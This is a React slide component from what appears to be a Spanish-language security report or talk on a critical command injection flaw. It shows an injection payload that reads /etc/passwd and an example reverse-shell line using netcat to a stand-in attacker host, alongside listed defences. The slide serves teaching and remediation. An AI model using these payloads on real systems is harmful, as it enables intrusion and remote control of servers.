export default function CmdDesc() {
  return (
    <div className="slide slide--two-col">
      <div className="col-accent">
        <span className="eyebrow eyebrow--light">10 — VULNERABILIDAD</span>
        <h2 className="slide-title slide-title--light slide-title--sm">Command Injection</h2>
        <div className="divider divider--light" />
        <div className="cvss-display" style={{background:"rgba(192,0,26,0.2)",border:"1px solid rgba(192,0,26,0.4)"}}>
          <span className="cvss-score" style={{color:"#ff6680"}}>10.0</span>
          <div className="cvss-info">
            <span className="cvss-level" style={{color:"#ff6680"}}>CRÍTICO</span>
            <span className="cvss-vector" style={{color:"rgba(255,255,255,0.4)"}}>AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</span>
          </div>
        </div>
      </div>
      <div className="col-main">
        <div className="vuln-block">
          <span className="vuln-block__label">PAYLOAD UTILIZADO</span>
          <code className="code-pill">127.0.0.1; cat /etc/passwd</code>
        </div>
        <div className="vuln-block">
          <span className="vuln-block__label">POR QUE OCURRE</span>
          <p className="vuln-block__text">
            La aplicacion pasa el input directamente a{" "}
            <code style={{background:"var(--red-light)",color:"var(--red)",padding:"1px 5px",borderRadius:"2px",fontFamily:"var(--mono)",fontSize:"12px"}}>shell_exec()</code>
            {" "}sin validacion. El separador{" "}
            <code style={{background:"var(--red-light)",color:"var(--red)",padding:"1px 5px",borderRadius:"2px",fontFamily:"var(--mono)",fontSize:"12px"}}>;</code>
            {" "}permite encadenar comandos arbitrarios. Un atacante podria obtener una reverse shell:
          </p>
          <code className="code-pill" style={{marginTop:"10px"}}>127.0.0.1; nc -e /bin/bash atacante.com 4444</code>
        </div>
        <div className="vuln-block">
          <span className="vuln-block__label">DEFENSA</span>
          <p className="vuln-block__text">Eliminar shell_exec() · Validacion regex de IP · APIs nativas · Minimo privilegio del servidor · WAF</p>
        </div>
      </div>
    </div>
  );
}